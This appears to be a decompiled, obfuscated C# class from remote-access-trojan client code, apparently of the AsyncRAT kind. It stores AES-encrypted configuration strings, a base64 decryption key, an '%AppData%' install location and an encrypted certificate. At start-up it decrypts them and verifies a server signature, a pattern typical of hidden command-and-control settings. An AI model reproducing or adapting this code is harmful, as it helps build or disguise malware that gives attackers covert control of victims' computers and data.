using System;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using ns20;
using ns23;

namespace ns1;

public static class GClass10
{
	public static string string_0 = "3rMuPv8dzTMT2Fp/VZw5GztfA/hr5eLZxmXmnqkfjxcZpXIQRdKcWorLRZfYBBi3My+CmIxHmexPtaB0soCLOxMIEEb8PdXaBPU/ySwx0mM3GpLMDVthQQl/7lPLHbS0";

	public static string string_1 = "hV3uKVYsMjz1AjQ5paBL7WlnLC0iyzGQNdZVUYs4u6BcgB424tMvZ8M6aB3qJhdC1plh2F0mo9VWg/SJ0lQIhA==";

	public static string string_2 = "o9hMT0050TjtYBfnuc0w/ScNSybQyMjpjoTuF53NGYiP68MALl/8ypOCt1Yh9WDt8HyPtqZRwOia9qnwGOJehw==";

	public static string string_3 = "3KDK/2Py0+2KRItHZFahK0GtR9VmFXo2Ehk9fleoyr/yPQvyysAxwBnPRhOmaAe9XKzDIsXamskO7dM+fBXLtg==";

	public static string string_4 = "fExQPH3CfJGNjqIdVfjqiUoi+RZ9CmoWddYLAAyhgZf8rk/KvrfTeEjuxHRzLxMfCn9kglU7//M+5Fez3z8LTA==";

	public static string string_5 = "Fknc3/OcUT3V07CgwFzJiueHFAE9RZKhx+pVQM05e5BE7c+t/7Pe0eoPy775SeU7VuLeOaYVG84RXYcdIq9xFA==";

	public static string string_6 = "%AppData%";

	public static string string_7 = "";

	public static string string_8 = "SmxTTElIOWRLYWlkMU9VN1N5dnBXeVdOcWZXRjZ3MkE=";

	public static string string_9 = "Yp8uFRpf5Z/5X2F9FznViQmatxhMda1xoziwnsLVbQUB2vsrtXCyKOjbUNrHRyF6eB2r8xmgd7+1d2nlr6DEwUeWqdaatfceiQXGDB/SNXk=";

	public static string string_10 = "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";

	public static string string_11 = "wK0DVaUFnTc5dSgaOUISrCQnpteLsq0uQQ2Kuz0FDIeKvIZNa4BF7tssUau4biRzl3RH+oi2gqPqvpwtcnR4eBTX8cE2Pvlta8NTsZ3rd04HZut+6BubMlJXe8vKAkWWblSDvfyz4Qpfq9H3ZD6Fl+VfZ/GgUod9UaKbXPOIMzABxEvWWot8hdf17eNBV1mKBJEMTDEC4j7XqP57wtfZGHZXoh043HZdH79RAoJrduKkxM85OSSXcgzH5zp8vDH71akGm/2VSlkjqdgR1DhlFrm+SdATXyNBSEeV65dxcVQITiR509nw422n/kbYDsPwJZ8ByGPsewqnwIPNxJ/hxc7Wfil35QuORn1vhFP9aQ680FG/WVtopRQ24QgxVvVjdgtFaDO5GxknzSj3R9XWG9K3sE+WQCUEiXIQhyHa9OCf/LcW/Enfr4SjaOfK7NUxGThBRMeK5DxlGCStS23MPHNKoQfBtxWpYpAIj4AqpGwCj3TOK1FTviWPwFku+qpfxjbPzx0TxwbNJW96c9pJFkDOdaUDgymY6371vu1NMtmAK7bOP6twH65CDvjTcfUTrADn0YJxYx2TpAr7r0LU6+CYYwVM+YP2shE4OxwgprU9bhMxFyIzz/32Ioymj8tVVI5f2Q/DufwCOGuqOJak7QdkF8y7QUn/LRfeG5GMlRVEYeAlZlK+5Y1JJDW/8u6JjPOQIAYp5ap1lfYMQcB/Zl1a9WvnFoVXq/cq011f10aPLkSY7tR9vot7Slv1BOpyk9LyjR98Gv0VvlD8vTX9BwN+soaQQRoEZjeNaP6MC2yWHH6lnPWcCkw+YvdLBmThabJQf7+goDua/tR7qBTtekzcVoHidKxIMhc803dATnhGd7VpwHdrW1cJXhsnt8kjiZuwbXPioWVlIeafy8MWFzCD/SWwHZjNOxaYIkFHdL/1j6IrNEdeiCKO/cfk4xBuftj67Zyxn8Ros7Xy74VHgw==";

	public static X509Certificate2 x509Certificate2_0;

	public static string string_12 = "ouHDao5jsnBOznBpywZuFcoVbPJJQChCsz0L+FvPU0Az4RRptkoCpLStFcE8LCs08VRdL1dQneSn4ELXw/Vbjg==";

	public static GClass29 gclass29_0;

	public static string string_13 = "K7CCGgQaEROVqnUHUtut4lB8J7E+D9EFJjcXEUSmwoI2S1rftbuj1YIYQu6jbWPe9yHBiD826nTEpKwc4YyQ8g==";

	public static string string_14 = "d/GvXImH1TwpStz1yP3alVpIAfy9U5IbHj8z8ihA5Eu4y4ZJKCelnQDtqWW13uefXWzWcfDGxhqG6u+NbVY7DA==";

	public static string string_15 = null;

	public static string string_16 = "3";

	public static string string_17 = "47N51TO9OVybkq3fYM6C1giShpvVNCwcmqpXgwXcelDN3OTYu9aEYqfM2CvDrCbTskgW0/VQuqkozHKYhQ3apQ==";

	public static bool smethod_0()
	{
		try
		{
			string_8 = Encoding.UTF8.GetString(Convert.FromBase64String(string_8));
			gclass29_0 = new GClass29(string_8);
			string_0 = gclass29_0.method_2(string_0);
			string_1 = gclass29_0.method_2(string_1);
			string_2 = gclass29_0.method_2(string_2);
			string_3 = gclass29_0.method_2(string_3);
			string_4 = gclass29_0.method_2(string_4);
			string_5 = gclass29_0.method_2(string_5);
			string_9 = gclass29_0.method_2(string_9);
			string_13 = gclass29_0.method_2(string_13);
			string_12 = gclass29_0.method_2(string_12);
			string_14 = gclass29_0.method_2(string_14);
			string_17 = gclass29_0.method_2(string_17);
			string_15 = GClass20.smethod_0();
			string_11 = gclass29_0.method_2(string_11);
			x509Certificate2_0 = new X509Certificate2(Convert.FromBase64String(gclass29_0.method_2(string_10)));
			return smethod_1();
		}
		catch
		{
			return false;
		}
	}

	private static bool smethod_1()
	{
		try
		{
			return ((RSACryptoServiceProvider)x509Certificate2_0.PublicKey.Key).VerifyHash(GClass30.smethod_1(Encoding.UTF8.GetBytes(string_8)), CryptoConfig.MapNameToOID("SHA256"), Convert.FromBase64String(string_11));
		}
		catch (Exception)
		{
			return false;
		}
	}
}
